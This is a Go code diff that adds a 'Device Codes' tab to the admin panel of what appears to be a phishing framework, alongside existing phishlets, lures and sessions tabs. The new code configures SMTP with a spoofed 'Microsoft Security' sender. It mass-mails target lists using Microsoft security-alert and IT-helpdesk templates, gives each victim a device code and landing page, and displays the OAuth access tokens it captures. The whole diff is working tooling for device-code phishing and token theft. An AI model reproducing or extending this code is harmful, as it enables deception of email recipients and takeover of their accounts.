@@ -414,6 +414,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		{"phishlets", "Phishlets"},
 		{"lures", "Lures & Chains"},
 		{"sessions", "Sessions"},
+		{"devicecodes", "Device Codes"},
 		{"blacklist", "Blacklist"},
 		{"telegram", pendingLabel},
 	}
@@ -730,6 +731,159 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 				}
 				b.WriteString(`</tbody></table>`)
 			}
+		}
+		b.WriteString(`</div>`)
+
+	// ── DEVICE CODES ──────────────────────────────────────────────────────
+	case "devicecodes":
+		// Handle POST actions
+		if r.Method == "POST" {
+			action := r.FormValue("action")
+			switch action {
+			case "save_smtp":
+				host := strings.TrimSpace(r.FormValue("smtp_host"))
+				portStr := strings.TrimSpace(r.FormValue("smtp_port"))
+				user := strings.TrimSpace(r.FormValue("smtp_user"))
+				pass := r.FormValue("smtp_pass")
+				from := strings.TrimSpace(r.FormValue("smtp_from"))
+				port, _ := strconv.Atoi(portStr)
+				s.Cfg.SetSmtp(host, port, user, pass, from)
+				http.Redirect(w, r, "/admin/panel?tab=devicecodes&ok=smtp+saved", http.StatusSeeOther)
+				return
+			case "launch_campaign":
+				name := strings.TrimSpace(r.FormValue("camp_name"))
+				tmpl := r.FormValue("camp_template")
+				emailsRaw := r.FormValue("camp_emails")
+				var emails []string
+				for _, line := range strings.Split(emailsRaw, "\n") {
+					e := strings.TrimSpace(line)
+					if e != "" {
+						emails = append(emails, e)
+					}
+				}
+				if len(emails) == 0 {
+					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err=no+emails", http.StatusSeeOther)
+					return
+				}
+				camp, _ := LaunchCampaign(name, tmpl, emails)
+				http.Redirect(w, r, fmt.Sprintf("/admin/panel?tab=devicecodes&ok=campaign+%d+launched+(%d+targets)", camp.ID, len(camp.Targets)), http.StatusSeeOther)
+				return
+			}
+		}
+
+		baseURL := "http://" + s.Cfg.GetServerExternalIP()
+
+		// ── SMTP config ──
+		b.WriteString(`<div class="section"><h2>SMTP Configuration</h2>`)
+		b.WriteString(fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
+<input type="hidden" name="action" value="save_smtp">
+<div class="form-row">
+  <label style="color:#666;width:120px;font-size:.8rem">SMTP Host</label>
+  <input type="text" name="smtp_host" placeholder="smtp.gmail.com" value="%s" style="width:240px">
+  <label style="color:#666;width:60px;font-size:.8rem">Port</label>
+  <input type="text" name="smtp_port" placeholder="587" value="%s" style="width:70px">
+</div>
+<div class="form-row">
+  <label style="color:#666;width:120px;font-size:.8rem">Username</label>
+  <input type="text" name="smtp_user" placeholder="user@gmail.com" value="%s" style="width:240px">
+  <label style="color:#666;width:60px;font-size:.8rem">Password</label>
+  <input type="password" name="smtp_pass" placeholder="••••••••" value="%s" style="width:160px">
+</div>
+<div class="form-row">
+  <label style="color:#666;width:120px;font-size:.8rem">From Name/Email</label>
+  <input type="text" name="smtp_from" placeholder="Microsoft Security &lt;no-reply@microsoft.com&gt;" value="%s" style="width:360px">
+</div>
+<button type="submit">Save SMTP</button>
+</form></div></div>`,
+			template.HTMLEscapeString(s.Cfg.GetSmtpHost()),
+			func() string {
+				p := s.Cfg.GetSmtpPort()
+				if p == 0 {
+					return "587"
+				}
+				return strconv.Itoa(p)
+			}(),
+			template.HTMLEscapeString(s.Cfg.GetSmtpUser()),
+			template.HTMLEscapeString(s.Cfg.GetSmtpPass()),
+			template.HTMLEscapeString(s.Cfg.GetSmtpFrom()),
+		))
+
+		// ── Launch campaign ──
+		b.WriteString(`<div class="section"><h2>Launch Campaign</h2><div class="card">
+<form method="POST" action="/admin/panel?tab=devicecodes">
+<input type="hidden" name="action" value="launch_campaign">
+<div class="form-row">
+  <label style="color:#666;width:120px;font-size:.8rem">Campaign Name</label>
+  <input type="text" name="camp_name" placeholder="Q2 Targets" style="width:220px">
+  <label style="color:#666;width:80px;font-size:.8rem">Template</label>
+  <select name="camp_template">
+    <option value="security_alert">Microsoft Security Alert</option>
+    <option value="it_helpdesk">IT Helpdesk</option>
+  </select>
+</div>
+<div class="form-row" style="align-items:flex-start">
+  <label style="color:#666;width:120px;font-size:.8rem;margin-top:6px">Email List</label>
+  <textarea name="camp_emails" rows="6" placeholder="one@company.com&#10;two@company.com&#10;..." style="width:400px;background:#171717;border:1px solid #2e2e2e;color:#e0e0e0;padding:8px;border-radius:4px;font-size:.84rem;resize:vertical"></textarea>
+</div>
+<button type="submit" class="btn-green">🚀 Launch</button>
+<span style="color:#555;font-size:.78rem;margin-left:12px">Each target gets a unique code + landing page. Emails sent via SMTP above.</span>
+</form></div></div>`)
+
+		// ── Active sessions table ──
+		allTargets := GetDCTargets()
+		b.WriteString(`<div class="section"><h2>Active Sessions</h2>`)
+		if len(allTargets) == 0 {
+			b.WriteString(`<div class="empty">No device code sessions yet.</div>`)
+		} else {
+			b.WriteString(`<table><thead><tr>
+<th>#</th><th>Email / Tenant</th><th>Code</th><th>Status</th>
+<th>Landing Page</th><th>Started</th><th>Access Token</th></tr></thead><tbody>`)
+			for i := len(allTargets) - 1; i >= 0; i-- {
+				tgt := allTargets[i]
+				status := tgt.GetStatus()
+				badgeClass := "badge-yellow"
+				switch status {
+				case "completed":
+					badgeClass = "badge-green"
+				case "expired", "declined", "error":
+					badgeClass = "badge-red"
+				}
+				label := tgt.Email
+				if label == "" {
+					label = tgt.Tenant
+				}
+				landingURL := baseURL + "/dc/" + tgt.LandingToken
+				landingCell := fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:.75rem">%s</a>`,
+					template.HTMLEscapeString(landingURL), template.HTMLEscapeString("/dc/"+tgt.LandingToken[:8]+"..."))
+
+				tgt.mu.Lock()
+				at := tgt.AccessToken
+				tgt.mu.Unlock()
+				tokenCell := `<span style="color:#383838">—</span>`
+				if at != "" {
+					tokenCell = fmt.Sprintf(`<details><summary>show</summary><pre style="max-width:300px;overflow-x:auto">%s</pre></details>`,
+						template.HTMLEscapeString(at))
+				}
+
+				b.WriteString(fmt.Sprintf(`<tr>
+<td class="mono">%d</td>
+<td class="mono">%s</td>
+<td><span style="font-family:monospace;font-weight:700;font-size:1rem;letter-spacing:3px;color:#e0a040">%s</span></td>
+<td><span class="badge %s">%s</span></td>
+<td>%s</td>
+<td class="mono" style="color:#555">%s</td>
+<td>%s</td>
+</tr>`,
+					tgt.ID,
+					template.HTMLEscapeString(label),
+					template.HTMLEscapeString(tgt.UserCode),
+					badgeClass, status,
+					landingCell,
+					tgt.StartedAt.Format("Jan 2 15:04"),
+					tokenCell,
+				))
+			}
+			b.WriteString(`</tbody></table>`)
 		}
 		b.WriteString(`</div>`)
 
